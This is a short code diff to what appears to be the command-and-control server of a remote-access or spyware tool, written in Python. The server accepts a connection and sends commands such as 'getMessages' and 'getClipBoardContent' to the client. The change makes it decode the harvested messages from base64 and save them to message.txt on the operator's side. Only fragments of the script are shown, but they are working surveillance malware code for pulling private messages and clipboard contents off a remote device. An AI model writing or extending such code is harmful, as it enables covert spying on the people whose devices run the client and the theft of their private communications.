@@ -12,7 +12,7 @@ server_soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 server_soc.bind((HOST, PORT))
 server_soc.listen(1)
-print("Listening for connections.... ")
+print("Listening for connections on " + str(server_soc))
 
 conn, addr = server_soc.accept()
 print("Connection from " + str(addr))
@@ -60,7 +60,15 @@ while True:
     
     elif dataSend.strip() == "getMessages":
         conn.send(dataSend.encode("UTF-8"))
-        print(str(recvall(conn)))
+        print("Writing it to messages.txt")
+        file = open("message.txt", 'a')
+        file.write("--------------------------------------")
+        messages_data = recvall(conn)
+        messages_data = messages_data.rstrip("\n")
+        print(messages_data)
+        file.write(base64.b64decode(messages_data).decode("UTF-8"))
+        file.close()
+        print("Done...")
 
     elif dataSend.strip() == "getClipBoardContent":
         conn.send(dataSend.encode("UTF-8"))
